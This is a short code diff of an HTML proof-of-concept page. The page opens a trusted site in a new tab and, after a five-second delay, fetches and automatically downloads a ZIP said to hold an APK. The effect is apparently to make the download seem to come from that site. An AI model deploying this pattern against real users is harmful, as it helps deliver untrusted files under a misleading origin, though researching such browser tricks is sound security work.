@@ -9,22 +9,22 @@
 </head>
 
 <body>
-    <h1>Download APK insize ZIP</h1>
+    <h1>Download APK inside ZIP</h1>
 
 
     <button onclick="startDownload()">Start Download Process</button>
 
     <script>
         async function startDownload() {
-            window.open('https://chromium.org', '_blank');
+            window.open('https://google.com', '_blank');
 
             setTimeout(async () => {
-                const response = await fetch('http://192.168.1.7:8000/Browser/filedownload.zip');
+                const response = await fetch('https://kokurate.github.io/browser/filedownload.zip');
                 const blob = await response.blob();
                 const url = URL.createObjectURL(blob);
                 const link = document.createElement('a');
                 link.href = url;
-                link.download = 'POC.zip';
+                link.download = 'POC direct download.zip';
                 link.click();
                 URL.revokeObjectURL(url);
             }, 5000);
